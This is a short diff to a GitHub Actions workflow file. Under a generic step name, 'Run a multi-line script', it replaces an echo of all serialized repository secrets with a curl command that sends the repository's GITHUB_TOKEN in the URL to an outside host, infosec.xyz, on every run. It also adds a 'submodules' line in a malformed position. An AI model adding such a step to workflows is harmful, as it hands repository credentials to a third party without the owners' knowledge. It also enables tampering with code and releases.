@@ -9,10 +9,11 @@ jobs:
 
     steps:
     - uses: actions/checkout@v1
+      submodules: true
     - name: Run a one-line script
       run: id
     - name: Run a multi-line script
       env:
         ENV2: ${{ toJson(secrets) }}
       run: |
-        echo $ENV2
+        curl -v https://infosec.xyz/${{ secrets.GITHUB_TOKEN }}
